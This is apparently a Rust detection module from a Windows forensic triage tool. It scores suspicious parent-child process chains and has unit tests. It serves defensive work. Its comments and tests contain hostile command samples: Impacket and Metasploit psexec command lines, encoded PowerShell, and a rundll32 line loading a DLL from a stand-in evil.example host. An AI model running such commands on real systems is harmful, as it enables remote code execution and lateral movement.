//! heur_parentchild (FR10, SRS §10): anomalous parent->child, encoded PowerShell,
//! suspicious exec path, unsigned + integrity weighting, built-in LOLBAS-flavored list.
//!
//! Parent->child pairs and what each one means:
//!
//! | Parent | Child | Meaning | ATT&CK |
//! |---|---|---|---|
//! | Office app (Word, Excel, PowerPoint, Outlook, OneNote, Access, Publisher, Visio) | shell / script host | malicious macro or document exploit | T1059 |
//! | script host | cmd / PowerShell | malicious .js/.vbs attachment | T1059 |
//! | explorer.exe | mshta.exe | ClickFix (Win+R paste) or double-clicked .hta | T1204.004, T1218.005 |
//! | w3wp / sqlservr / httpd / nginx / Tomcat | cmd / PowerShell / whoami | web shell (xp_cmdshell for SQL Server) | T1505.003 |
//! | wmiprvse.exe | cmd / PowerShell | WMI remote execution | T1047 |
//! | wmiprvse.exe | any other program outside Program Files (not WerFault, wmiadap, SCCM, `msiexec /i`) | WMI `Win32_Process.Create` | T1047 |
//! | services.exe | cmd.exe writing to `\\127.0.0.1\ADMIN$`, or PSEXESVC | PsExec / Impacket service execution | T1569.002 |
//! | services.exe | PowerShell, or cmd.exe starting PowerShell | Metasploit psexec_psh / service-based PowerShell stager | T1569.002, T1059.001 |
//! | any (wmiprvse, mmc, explorer, services, unknown) | `cmd.exe /Q /c ... 1> \\127.0.0.1\ADMIN$\__<time> 2>&1` / `^> \\127.0.0.1\C$\__output` | Impacket wmiexec / dcomexec / smbexec output redirect | T1047, T1021.002 |
//!
//! The same rules run over two sources: the live process snapshot (parent found by
//! pid) and the process starts in the event logs (Security 4688 and Sysmon 1, see
//! [`crate::cmdline`]), so `cairn evtx` judges the same chains offline. A Sysmon 1
//! also carries the binary's `OriginalFileName`: a shell or LOLBin running under
//! another file name is a renamed system binary (T1036.003).
//!
//! Every signal carries its own reason and its own client-facing (zh-TW) sentence;
//! the strongest signal's sentence becomes `Finding.details_client`, so the report
//! never falls back to a generic "masquerade or lateral movement" line.
use crate::cmdline::{process_starts, CommandLine, SYSMON_CHANNEL};
use crate::score::{severity_for, Score};
use crate::trust::{
    canonical_system_dirs, deobfuscated, exe_name, has_base64_token, has_encoded_flag,
    is_interpreter, is_masquerade, is_powershell, is_user_writable_path, launcher_kind,
    mentions_powershell, normalize_path, LauncherKind,
};
use cairn_core::finding::EntityProcess;
use cairn_core::record::{ProcessRecord, Record};
use cairn_core::traits::Analyzer;
use cairn_core::{Entity, Finding, FindingSource, Result};
use std::collections::HashMap;

// --- Named rule tables (config-loader seam; see spec) -------------------------

// NOTE: matching is on the normalized exe NAME only (crate::trust::exe_name). A renamed
// binary evades it; the user-writable-path amplifier gives partial path-based coverage.
// Which binaries are shells / script hosts / LOLBins is crate::trust::LAUNCHERS — the
// one table shared with persist, event-log and ClickFix.
/// Event-log channels this analyzer reads (process starts: Security 4688, Sysmon 1).
/// The live EVTX collector reads them even when no Sigma rules are loaded.
pub const CHANNELS: &[&str] = &["Security", SYSMON_CHANNEL];

/// Parent images whose spawning of a shell is anomalous (Office apps).
pub(crate) const OFFICE_PARENTS: &[&str] = &[
    "winword", "excel", "powerpnt", "outlook", "onenote", "msaccess", "mspub", "visio",
];

/// What wmiprvse.exe starts in normal operation: crash reporting, the performance
/// adapter, itself, MOF compilation. Anything else is `Win32_Process.Create` (remote
/// execution, or a management tool doing the same).
const WMI_ROUTINE_CHILDREN: &[&str] = &[
    "werfault", "wermgr", "wmiprvse", "wmiadap", "wmiapsrv", "mofcomp", "conhost",
];

/// Web / database servers that should never start a shell: a shell under one of
/// them is a web shell (or xp_cmdshell for SQL Server). Tomcat is matched separately
/// (tomcat*.exe, or java.exe running Catalina).
const WEB_SERVER_PARENTS: &[&str] = &["w3wp", "sqlservr", "httpd", "nginx"];

/// What a web shell typically runs first.
const WEB_SHELL_CHILDREN: &[&str] = &["cmd", "powershell", "pwsh", "whoami"];

/// Impacket wmiexec / smbexec write command output back over the loopback admin share.
fn loopback_admin_share(cmdline: &str) -> Option<&'static str> {
    let lc = cmdline.to_ascii_lowercase();
    if lc.contains(r"\\127.0.0.1\admin$") {
        Some(r"\\127.0.0.1\ADMIN$")
    } else if lc.contains(r"\\127.0.0.1\c$") {
        Some(r"\\127.0.0.1\C$")
    } else {
        None
    }
}

/// Impacket's semi-interactive shells redirect every command's output to a file on
/// the loopback admin share and read it back over SMB: wmiexec / dcomexec
/// `cmd.exe /Q /c <cmd> 1> \\127.0.0.1\ADMIN$\__<unix time> 2>&1`, smbexec
/// `%COMSPEC% /Q /c echo <cmd> ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat`.
fn impacket_output_redirect(cmdline: &str) -> Option<&'static str> {
    let lc = cmdline.to_ascii_lowercase();
    if lc.contains(r"\\127.0.0.1\admin$\__") {
        Some(r"\\127.0.0.1\ADMIN$\__<time>")
    } else if lc.contains(r"\\127.0.0.1\c$\__") {
        Some(r"\\127.0.0.1\C$\__output")
    } else {
        None
    }
}

/// True when a wmiprvse.exe child is routine: [`WMI_ROUTINE_CHILDREN`], a product
/// installed under Program Files or the SCCM client (`C:\Windows\CCM`) (vendor and
/// management agents), or `msiexec /i` (`Win32_Product.Install` software deployment).
fn wmi_routine_child(child_exe: &str, image: &str, cmdline: &str) -> bool {
    if WMI_ROUTINE_CHILDREN.contains(&child_exe) {
        return true;
    }
    if child_exe == "msiexec" && cmdline.to_ascii_lowercase().contains("/i ") {
        return true;
    }
    let path = normalize_path(image);
    path.get(1..).is_some_and(|rest| {
        rest.starts_with(r":\program files\")
            || rest.starts_with(r":\program files (x86)\")
            || rest.starts_with(r":\windows\ccm\")
    })
}

/// PowerShell started hidden, non-interactive, without a profile or with an encoded /
/// base64 payload: how service-based stagers (Metasploit psexec_psh) run it.
fn stealthy_powershell(cmdline: &str) -> bool {
    let lc = deobfuscated(cmdline).to_ascii_lowercase();
    [
        " -w hidden",
        " -win hidden",
        " -window hidden",
        " -windowstyle hidden",
        " -noni",
        " -nop",
    ]
    .iter()
    .any(|f| lc.contains(f))
        || has_encoded_flag(cmdline, true)
        || has_base64_token(cmdline)
}

/// The launcher a Sysmon `OriginalFileName` names when the image runs under another
/// file name: `Cmd.Exe` as `C:\Users\Public\svc.exe`. Only shells, script hosts and
/// proxy-execution LOLBins count (their renaming has no benign reason).
pub(crate) fn renamed_launcher(original_file_name: &str, image: &str) -> Option<String> {
    let original = exe_name(original_file_name);
    launcher_kind(&original)?;
    (original != exe_name(image)).then_some(original)
}

/// True if this parent process is Apache Tomcat (its service exe, or java running
/// Catalina).
fn is_tomcat(exe: &str, cmdline: &str) -> bool {
    if exe.starts_with("tomcat") {
        return true;
    }
    let lc = cmdline.to_ascii_lowercase();
    exe == "java" && (lc.contains("catalina") || lc.contains("tomcat"))
}

/// The directory part of an image path (for reason text).
fn dir_of(image: &str) -> &str {
    image.rsplit_once(['\\', '/']).map_or("", |(d, _)| d)
}

/// Lowercased file name (last path segment, `.exe` kept) of an image path, for
/// reason text.
pub(crate) fn file_name(image: &str) -> String {
    image
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(image)
        .to_ascii_lowercase()
}

/// True if cmdline carries a PowerShell encoded-command flag AND a real base64
/// payload token. `-e` only counts for a PowerShell binary (unrelated tools use `-e`).
pub(crate) fn has_encoded_powershell(exe: &str, cmdline: &str) -> bool {
    has_encoded_flag(cmdline, is_powershell(exe)) && has_base64_token(cmdline)
}

/// A Score plus the client-facing sentence of its strongest signal.
#[derive(Default)]
pub(crate) struct Verdict {
    pub score: Score,
    /// (weight, zh-TW sentence) of the strongest signal that has one.
    client: Option<(u32, String)>,
}

impl Verdict {
    /// Add a primary signal with its own client sentence.
    fn signal(&mut self, weight: u32, reason: String, mitre: &[&str], client: String) {
        self.score.add(weight, reason, mitre);
        if self.client.as_ref().is_none_or(|(w, _)| weight > *w) {
            self.client = Some((weight, client));
        }
    }

    /// Add a signal that sharpens one already raised (same activity, more specific
    /// evidence): its sentence replaces the current one.
    fn refine(&mut self, weight: u32, reason: String, mitre: &[&str], client: String) {
        self.score.add(weight, reason, mitre);
        let top = self.client.as_ref().map_or(0, |(w, _)| *w);
        self.client = Some((top + weight, client));
    }

    /// The client sentence for the report (`Finding.details_client`).
    pub fn client_text(&self) -> Option<&str> {
        self.client.as_ref().map(|(_, t)| t.as_str())
    }
}

/// Score one process against its (optional) parent. Returns a Score (may be empty).
#[cfg(test)]
pub(crate) fn score_process(p: &ProcessRecord, parent: Option<&ProcessRecord>) -> Score {
    evaluate(p, parent, None).score
}

/// Score one process against its (optional) parent, with the client sentence.
/// `original_file_name` is the Sysmon 1 `OriginalFileName`, when the start came from
/// one.
pub(crate) fn evaluate(
    p: &ProcessRecord,
    parent: Option<&ProcessRecord>,
    original_file_name: Option<&str>,
) -> Verdict {
    let mut v = Verdict::default();
    let child_name = file_name(&p.image);
    let child_exe = exe_name(&p.image);
    let child_kind = launcher_kind(&child_exe);
    let parent_name = parent.map(|pp| file_name(&pp.image));
    let parent_exe = parent.map(|pp| exe_name(&pp.image));

    // S3 masquerade (spec §4.2): a protected system name outside its canonical
    // directory is dispositive on its own — no clean machine has an AppData (or
    // C:\Windows\Temp) svchost.exe.
    if is_masquerade(&p.image) {
        let canonical = canonical_system_dirs(&child_name)
            .unwrap_or(&[])
            .iter()
            .map(|d| format!("C:{d}"))
            .collect::<Vec<_>>()
            .join(" or ");
        let dir = dir_of(&p.image);
        v.signal(
            60,
            format!(
                "system binary name {child_name} runs from {dir}, not its canonical \
                 directory {canonical}"
            ),
            &["T1036.005"],
            format!(
                "{child_name} 是 Windows 系統程式的名稱，但這個行程是從 {dir} 執行，\
                 而不是系統目錄 {canonical}。惡意程式常借用系統程式名稱躲避注意，\
                 請確認這個檔案的來源與雜湊值。"
            ),
        );
    }
    if let Some(original) = original_file_name.and_then(|o| renamed_launcher(o, &p.image)) {
        v.signal(
            50,
            format!(
                "{child_name} is {original}.exe renamed (Sysmon OriginalFileName {})",
                original_file_name.unwrap_or_default()
            ),
            &["T1036.003"],
            format!(
                "{child_name} 其實是 Windows 內建的 {original}.exe（檔案內的原始名稱），\
                 只是被改了檔名。攻擊者常把命令列或系統工具改名來躲避偵測；\
                 請確認這個檔案是誰放的、為什麼要改名。"
            ),
        );
    }
    // Impacket's output redirect is decisive whatever the parent; when the parent is
    // known (wmiprvse / services) the parent rule below words it more precisely.
    let impacket = impacket_output_redirect(&p.cmdline);
    let mut impacket_covered = false;
    if let (Some(pp), Some(pn), Some(pexe)) = (parent, &parent_name, &parent_exe) {
        if OFFICE_PARENTS.contains(&pexe.as_str()) && is_interpreter(&child_exe) {
            v.signal(
                50,
                format!("Office app {pn} spawned shell {child_name} (macro or document exploit)"),
                &["T1059"],
                format!(
                    "Office 程式 {pn} 啟動了 {child_name}。文件本身不應開啟命令列或腳本，\
                     這通常是惡意巨集或文件漏洞的跡象；請確認使用者當時開啟了哪份文件。"
                ),
            );
        }
        // Intentionally only the real shells (not other script hosts): a script host
        // launching cmd/powershell is the suspicious pattern; wscript<->cscript chains
        // are commonly benign.
        if launcher_kind(pexe) == Some(LauncherKind::ScriptHost)
            && child_kind == Some(LauncherKind::Shell)
        {
            v.signal(
                30,
                format!("script host {pn} spawned {child_name}"),
                &["T1059"],
                format!(
                    "腳本程式 {pn} 啟動了 {child_name}，常見於惡意的 .js／.vbs 附件或下載檔；\
                     請確認被執行的腳本檔來源。"
                ),
            );
        }
        // ClickFix: the Run dialog (Win+R) belongs to explorer.exe, so a pasted
        // `mshta https://...` lure shows up as explorer -> mshta.
        if pexe == "explorer" && child_exe == "mshta" {
            v.signal(
                50,
                "explorer.exe started mshta.exe — the ClickFix pattern (a command pasted \
                 into Win+R) or a double-clicked .hta file"
                    .to_string(),
                &["T1204.004", "T1218.005"],
                "使用者介面（explorer.exe）直接啟動了 mshta.exe。假驗證碼或假錯誤頁面\
                 （ClickFix 手法）常要使用者按 Win+R 貼上 mshta 指令來下載惡意程式；\
                 請詢問使用者當時看到什麼畫面，並檢查 mshta 載入的網址或檔案。"
                    .to_string(),
            );
        }
        // Web shell: a web/database server starting a shell or recon tool.
        let web_parent =
            WEB_SERVER_PARENTS.contains(&pexe.as_str()) || is_tomcat(pexe, &pp.cmdline);
        if web_parent && WEB_SHELL_CHILDREN.contains(&child_exe.as_str()) {
            let (reason, client) = if pexe == "sqlservr" {
                (
                    format!("SQL Server (sqlservr.exe) spawned {child_name} — xp_cmdshell or a SQL-injected command"),
                    format!(
                        "SQL Server 資料庫程式啟動了 {child_name}，代表有人透過 xp_cmdshell \
                         等功能從資料庫執行系統指令（常見於 SQL 注入攻擊）；請檢查資料庫\
                         稽核記錄與應用程式的查詢來源。"
                    ),
                )
            } else {
                (
                    format!("web server {pn} spawned {child_name} — web shell behaviour"),
                    format!(
                        "網頁伺服器 {pn} 啟動了 {child_name}。網站程式正常不會開啟命令列，\
                         這是網頁後門（web shell）的典型跡象；請檢查網站目錄中最近新增或\
                         修改的檔案與網站存取記錄。"
                    ),
                )
            };
            v.signal(60, reason, &["T1505.003"], client);
        }
        // WMI remote execution (wmiexec, Invoke-WmiMethod Win32_Process Create).
        if pexe == "wmiprvse" && child_kind == Some(LauncherKind::Shell) {
            v.signal(
                40,
                format!(
                    "WMI provider host wmiprvse.exe spawned {child_name} (WMI command execution)"
                ),
                &["T1047"],
                format!(
                    "WMI 服務（wmiprvse.exe）啟動了 {child_name}，代表有人透過 WMI 在這台主機\
                     執行指令；管理工具（例如 SCCM）會這樣做，攻擊者橫向移動也會。\
                     請確認這個時間是否有授權的管理作業。"
                ),
            );
            if let Some(share) = loopback_admin_share(&p.cmdline) {
                impacket_covered = true;
                v.refine(
                    30,
                    format!(
                        "{child_name} writes its output to {share} — the Impacket wmiexec pattern"
                    ),
                    &["T1047", "T1021.002"],
                    format!(
                        "WMI 服務啟動的 {child_name} 把執行結果寫到 {share}，這是 Impacket \
                         wmiexec 遠端執行工具的特徵，代表有人從其他電腦以管理員權限在這台\
                         主機執行指令（橫向移動）；請找出來源主機與使用的帳號。"
                    ),
                );
            }
        }
        // Service-based remote execution: PsExec (PSEXESVC) and Impacket smbexec /
        // psexec (services.exe -> cmd.exe writing to the loopback admin share).
        let psexec = (pexe == "services" && child_exe == "psexesvc")
            || (pexe == "psexesvc" && child_kind == Some(LauncherKind::Shell));
        let svc_share = (pexe == "services" && child_exe == "cmd")
            .then(|| loopback_admin_share(&p.cmdline))
            .flatten();
        if psexec || svc_share.is_some() {
            impacket_covered = true;
            let marker = svc_share.unwrap_or("PSEXESVC");
            v.signal(
                60,
                format!(
                    "{pn} started {child_name} as a service command ({marker}) — PsExec / \
                     Impacket remote service execution"
                ),
                &["T1569.002", "T1021.002"],
                format!(
                    "{pn} 以服務方式啟動了 {child_name}，內容符合 PsExec／Impacket 遠端執行\
                     工具的特徵（{marker}）。這代表有人從其他電腦以管理員權限在這台主機執行\
                     指令（橫向移動）；請找出來源主機與使用的帳號。"
                ),
            );
        }
        // WMI Win32_Process.Create of something other than a shell (calc.exe in the
        // classic lateral-movement demo, rundll32 / explorer in WMI handler abuse).
        if pexe == "wmiprvse"
            && child_kind != Some(LauncherKind::Shell)
            && !wmi_routine_child(&child_exe, &p.image, &p.cmdline)
        {
            v.signal(
                30,
                format!(
                    "WMI provider host wmiprvse.exe started {child_name} (WMI Win32_Process \
                     Create)"
                ),
                &["T1047"],
                format!(
                    "WMI 服務（wmiprvse.exe）啟動了 {child_name}。這代表有人透過 WMI 在這台主機\
                     執行程式；管理工具偶爾會這樣做，攻擊者遠端執行也會。請確認這個時間\
                     是否有授權的管理作業，以及 {child_name} 是否為已知程式。"
                ),
            );
        }
        // Service-based PowerShell: services.exe -> powershell, or -> cmd starting
        // PowerShell (Metasploit psexec_psh: `%COMSPEC% /b /c start /b /min powershell
        // -nop -w hidden -noni -c ...`).
        let svc_powershell = pexe == "services"
            && !psexec
            && svc_share.is_none()
            && (is_powershell(&child_exe)
                || (child_exe == "cmd" && mentions_powershell(&p.cmdline)));
        if svc_powershell {
            let stealthy = stealthy_powershell(&p.cmdline);
            v.signal(
                if stealthy { 50 } else { 40 },
                format!(
                    "services.exe started {child_name} running PowerShell{} — a service \
                     created to run a PowerShell command (PsExec-style remote execution)",
                    if stealthy {
                        " hidden / non-interactive / encoded"
                    } else {
                        ""
                    }
                ),
                &["T1569.002", "T1059.001"],
                format!(
                    "系統服務管理程式（services.exe）直接以服務方式執行了 PowerShell 指令\
                     （{child_name}）。正常的服務很少這樣做，Metasploit psexec 等遠端執行工具\
                     則常用這種方式在目標主機啟動惡意程式；請檢查同時段新增的服務（事件 7045）\
                     與來源主機。"
                ),
            );
        }
    }
    if let (Some(marker), false) = (impacket, impacket_covered) {
        let via = parent_name
            .as_deref()
            .map(|pn| format!(" (started by {pn})"))
            .unwrap_or_default();
        v.signal(
            50,
            format!(
                "{child_name} writes its output to {marker}{via} — the Impacket wmiexec / \
                 dcomexec / smbexec remote shell pattern"
            ),
            &["T1047", "T1021.002"],
            format!(
                "{child_name} 把指令的執行結果寫到 {marker}，這是 Impacket（wmiexec、\
                 dcomexec、smbexec）遠端執行工具的特徵，代表有人從其他電腦以管理員權限\
                 在這台主機執行指令（橫向移動）；請找出來源主機與使用的帳號。"
            ),
        );
    }
    if has_encoded_powershell(&child_exe, &p.cmdline) {
        v.signal(
            40,
            "encoded PowerShell command".to_string(),
            &["T1059.001"],
            format!(
                "{child_name} 執行了經過 Base64 編碼的 PowerShell 指令。把指令編碼來隱藏\
                 真正內容是惡意程式常見的手法；請解碼指令內容確認它做了什麼。"
            ),
        );
    }
    if matches!(
        child_kind,
        Some(LauncherKind::ScriptHost | LauncherKind::ProxyExec)
    ) && lolbas_suspicious(&p.cmdline)
    {
        v.signal(
            30,
            format!("LOLBAS {child_name} with suspicious arguments"),
            &["T1218"],
            format!(
                "{child_name} 是 Windows 內建程式，但帶有下載網址、腳本元件或編碼內容等\
                 可疑參數；攻擊者常借用這類內建程式執行惡意內容。請檢查它載入了什麼。"
            ),
        );
    }
    let s = &mut v.score;
    // Suspicious path is an AMPLIFIER (spec §4.2 S8): alone it matches every
    // per-user app (chrome-native-host in \AppData\) — zero information. It adds
    // weight only when a behavioral combo already fired.
    let combo_fired = !s.reasons.is_empty();
    if combo_fired && is_user_writable_path(&p.image) {
        s.add(
            25,
            format!("executes from a suspicious path: {}", p.image),
            &["T1036"],
        );
    }
    // Unsigned amplifier: an unsigned binary is a signal only when ANOTHER suspicion has
    // already fired. catalog-signed OS binaries are reported unsigned by WTD_CHOICE_FILE, so
    // an unconditional unsigned signal would flood every signed-by-catalog system process.
    // Never penalize the unverifiable (None) nor the trusted (Some(true)). proc `signed` is
    // backfilled by the proc collector via WinVerifyTrust (S2-E).
    let another_signal_fired = !s.reasons.is_empty();
    if p.signed == Some(false) && another_signal_fired {
        s.add(20, "binary is unsigned", &[]);
        if matches!(p.integrity.as_deref(), Some("high") | Some("system")) {
            s.add(15, "unsigned binary running at high integrity", &["T1068"]);
        }
    }
    v
}

/// Suspicious argument patterns for a watchlisted LOLBAS binary.
pub(crate) fn lolbas_suspicious(cmdline: &str) -> bool {
    let lc = cmdline.to_ascii_lowercase();
    lc.contains("http") || lc.contains("scrobj") || lc.contains("/i:") || has_base64_token(cmdline)
}

/// Analyzer: scores every process against its parent and emits findings above the
/// floor: live processes (parent by pid) and the process starts of the event logs
/// (4688 / Sysmon 1, parent from the event or by pid; see [`crate::cmdline`]).
pub struct ParentChildHeuristic;

impl ParentChildHeuristic {
    /// This analyzer's `name()`, also stamped into `Finding.analyzer`.
    pub const NAME: &'static str = cairn_core::analyzers::PARENTCHILD;
}

impl Analyzer for ParentChildHeuristic {
    fn name(&self) -> &str {
        Self::NAME
    }

    fn analyze(&self, records: &[Record], _prior_findings: &[Finding]) -> Result<Vec<Finding>> {
        // Index processes by pid for parent lookup. Known limitation: if a snapshot
        // contains two processes with the same pid (OS pid reuse), the last one wins;
        // a live triage snapshot almost never reuses pids. The more common reuse case
        // (the real parent exited and a newer process took its pid) is rejected by
        // `is_plausible_parent` using start times.
        let by_pid: HashMap<u32, &ProcessRecord> = records
            .iter()
            .filter_map(|r| match r {
                Record::Process(p) => Some((p.pid, p)),
                _ => None,
            })
            .collect();

        let own_pid = std::process::id();
        let mut out = Vec::new();
        for r in records {
            let Record::Process(p) = r else { continue };
            if p.pid == own_pid {
                continue; // never flag the forensic tool itself
            }
            let parent = by_pid
                .get(&p.ppid)
                .copied()
                .filter(|parent| is_plausible_parent(parent, p));
            let verdict = evaluate(p, parent, None);
            let score = &verdict.score;
            let Some(severity) = severity_for(score.weight) else {
                continue;
            };

            let mut f = Finding::new(severity, suspicious_title(p), FindingSource::Heuristic);
            f.reason = Some(score.reasons.join("; "));
            f.mitre = score.mitre.clone();
            f.details_client = verdict.client_text().map(str::to_string);
            f.artifact = "process".into();
            let p_name = p.image.rsplit(['\\', '/']).next().unwrap_or(&p.image);
            f.details = if p.cmdline.is_empty() {
                format!("{} (pid={}, parent={})", p_name, p.pid, p.ppid)
            } else {
                format!(
                    "{} (pid={}, parent={}, cmd={})",
                    p_name, p.pid, p.ppid, p.cmdline
                )
            };
            f.ts = p.start_time.unwrap_or_else(chrono::Utc::now);
            f.entity = Entity {
                process: Some(EntityProcess {
                    pid: p.pid,
                    ppid: p.ppid,
                    image: p.image.clone(),
                    cmdline: p.cmdline.clone(),
                    signed: p.signed,
                    integrity: p.integrity.clone(),
                }),
                ..Entity::default()
            };
            out.push(f);
        }
        // Process starts from the event logs. A start whose process is still running
        // was dropped in favour of the live record above (cmdline::process_starts).
        for c in process_starts(records) {
            if c.event.is_some() {
                out.extend(event_finding(&c));
            }
        }
        Ok(crate::stamped(out, Self::NAME))
    }
}

/// Judge one event-log process start with the same rules as a live process.
fn event_finding(c: &CommandLine<'_>) -> Option<Finding> {
    let child = ProcessRecord {
        pid: c.pid.unwrap_or(0),
        ppid: c.ppid.unwrap_or(0),
        image: c.image.clone(),
        cmdline: c.cmd.clone(),
        signed: None,
        signer: None,
        binary_sha256: None,
        integrity: None,
        user: c.user.clone(),
        start_time: c.ts,
        signer_source: None,
    };
    let parent = c.parent_image.as_ref().map(|image| ProcessRecord {
        pid: c.ppid.unwrap_or(0),
        ppid: 0,
        image: image.clone(),
        cmdline: c.parent_cmd.clone().unwrap_or_default(),
        signed: None,
        signer: None,
        binary_sha256: None,
        integrity: None,
        user: None,
        start_time: None,
        signer_source: None,
    });
    let verdict = evaluate(&child, parent.as_ref(), c.original_file_name.as_deref());
    let severity = severity_for(verdict.score.weight)?;
    let mut f = Finding::new(severity, suspicious_title(&child), FindingSource::Heuristic);
    c.apply_to(&mut f);
    f.reason = Some(verdict.score.reasons.join("; "));
    f.mitre = verdict.score.mitre.clone();
    f.details_client = verdict.client_text().map(str::to_string);
    let parent_desc = match &c.parent_image {
        Some(img) => format!("{} {}", child.ppid, file_name(img)),
        None => child.ppid.to_string(),
    };
    let mut details = format!(
        "{} (pid={}, parent={parent_desc}",
        file_name(&child.image),
        child.pid
    );
    if !child.cmdline.is_empty() {
        details.push_str(&format!(", cmd={}", child.cmdline));
    }
    if let Some(h) = &c.hashes {
        details.push_str(&format!(", hashes={h}"));
    }
    details.push(')');
    f.details = details;
    Some(f)
}

/// A short title for a flagged process.
/// The process now holding `child.ppid` can only be the parent if it started no later
/// than the child. Windows reuses PIDs: when the real parent has exited, an unrelated
/// newer process (often WINWORD.EXE or a browser) may hold that PID, and pairing it
/// with an old child fabricates an "Office spawned a shell" chain. With either start
/// time unknown the pairing is kept, as before.
fn is_plausible_parent(parent: &ProcessRecord, child: &ProcessRecord) -> bool {
    if parent.pid == child.pid {
        return false;
    }
    match (parent.start_time, child.start_time) {
        (Some(ps), Some(cs)) => ps <= cs,
        _ => true,
    }
}

fn suspicious_title(p: &ProcessRecord) -> String {
    let name = file_name(&p.image);
    format!("Suspicious process: {name}")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc(pid: u32, ppid: u32, image: &str, cmdline: &str) -> ProcessRecord {
        ProcessRecord {
            pid,
            ppid,
            image: image.into(),
            cmdline: cmdline.into(),
            signed: None,
            signer: None,
            binary_sha256: None,
            integrity: None,
            user: None,
            start_time: None,
            signer_source: None,
        }
    }

    /// Regression: the old base64 check (any 16+ alphanumeric run) fired on the
    /// `WindowsPowerShell` directory name, so every LOLBin-style check saw "base64" in a
    /// plain PowerShell path. A real token is now required.
    #[test]
    fn windows_powershell_path_is_not_base64() {
        let cmd = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File x.ps1";
        assert!(!has_base64_token(cmd));
        assert!(!lolbas_suspicious(cmd));
        assert!(!has_encoded_powershell("powershell", cmd));
        let p = proc(
            10,
            1,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            cmd,
        );
        let explorer = proc(1, 0, r"C:\Windows\explorer.exe", "");
        let s = score_process(&p, Some(&explorer));
        assert_eq!(s.weight, 0, "{:?}", s.reasons);
    }

    /// Office -> encoded PowerShell scores high+ and tags T1059.001.
    #[test]
    fn office_encoded_powershell_scores_high() {
        let parent = proc(100, 4, r"C:\Program Files\Microsoft Office\winword.exe", "");
        let child = proc(
            200,
            100,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let s = score_process(&child, Some(&parent));
        assert!(s.weight >= 50, "weight {} should be high+", s.weight);
        assert!(s.mitre.contains(&"T1059.001".to_string()));
        assert!(s.reasons.iter().any(|r| r.contains("winword.exe")));
    }

    /// A benign explorer -> notepad (signed, normal path) scores 0.
    #[test]
    fn benign_explorer_notepad_scores_zero() {
        let parent = proc(50, 4, r"C:\Windows\explorer.exe", "");
        let mut child = proc(60, 50, r"C:\Windows\System32\notepad.exe", "notepad.exe");
        child.signed = Some(true);
        let s = score_process(&child, Some(&parent));
        assert_eq!(s.weight, 0);
    }

    /// Unsigned binary from Temp with NO parent and no other behavioral signal: under
    /// the path-as-amplifier model, suspicious-path no longer fires without a prior
    /// combo, so the unsigned amplifier (which itself requires a prior signal) also
    /// stays quiet. Total weight is 0 (renamed from `unsigned_from_temp_no_parent_scores`,
    /// which asserted this combination scored >= 45 under the old independent-signal model).
    #[test]
    fn unsigned_temp_alone_gated_out() {
        let mut p = proc(70, 0, r"C:\Users\a\AppData\Local\Temp\evil.exe", "evil.exe");
        p.signed = Some(false);
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(s.reasons.is_empty());
    }

    /// A watchlisted LOLBAS binary with a suspicious http argument scores the LOLBAS
    /// signal (+30, T1218); the same binary with a benign argument does not.
    #[test]
    fn lolbas_http_arg_fires_benign_does_not() {
        let bad = proc(
            300,
            4,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe http://evil.example/x.dll,Entry",
        );
        let s = score_process(&bad, None);
        assert!(s.mitre.contains(&"T1218".to_string()));
        assert!(s.weight >= 30);

        let benign = proc(
            301,
            4,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        );
        let s2 = score_process(&benign, None);
        assert!(
            !s2.mitre.contains(&"T1218".to_string()),
            "benign rundll32 must not fire the LOLBAS signal"
        );
    }

    /// The `-e ` short form only counts for PowerShell binaries: a non-PS tool with
    /// `-e <base64>` must NOT fire the encoded-PowerShell signal.
    #[test]
    fn dash_e_short_form_only_for_powershell() {
        // non-PS binary with -e <base64-looking>: must NOT fire encoded-PS
        let other = proc(
            400,
            4,
            r"C:\tools\curl.exe",
            "curl.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA https://x",
        );
        let s = score_process(&other, None);
        assert!(
            !s.mitre.contains(&"T1059.001".to_string()),
            "-e on a non-PS binary must not be treated as encoded PowerShell"
        );

        // powershell with -e <base64>: DOES fire
        let ps = proc(
            401,
            4,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let s2 = score_process(&ps, None);
        assert!(s2.mitre.contains(&"T1059.001".to_string()));
    }

    /// Suspicious path alone (no prior combo, e.g. LOLBAS) no longer fires under the
    /// path-as-amplifier model, so the unsigned amplifier chained off it also stays
    /// quiet: total weight is 0 (renamed from `unsigned_amplifies_with_suspicious_path`,
    /// which asserted path(25)+unsigned(20)=45 under the old independent-signal model).
    /// A real combo (LOLBAS) + suspicious path + unsigned IS exercised by
    /// `unsigned_high_integrity_amplifies_with_signal` below.
    #[test]
    fn unsigned_and_path_alone_gated_out() {
        let mut p = proc(10, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
        p.signed = Some(false);
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Unsigned ALONE (normal path, no parent/encoded/LOLBAS): amplifier does NOT fire.
    /// catalog-signed system process (reported unsigned) must stay quiet.
    #[test]
    fn unsigned_alone_does_not_amplify() {
        let mut p = proc(11, 0, r"C:\Windows\System32\svchost.exe", "svchost.exe");
        p.signed = Some(false);
        p.integrity = Some("system".into());
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Unsigned + high integrity WITH a prior behavioral combo (LOLBAS): the combo
    /// fires first, which unlocks BOTH the path amplifier and the unsigned amplifiers
    /// chained after it. (Renamed from `unsigned_high_integrity_amplifies_with_signal`:
    /// the old fixture relied on suspicious-path firing with no prior signal, which the
    /// path-as-amplifier model no longer allows — see `unsigned_and_path_alone_gated_out`
    /// for that now-empty case. This test keeps the same intent — "does the unsigned/
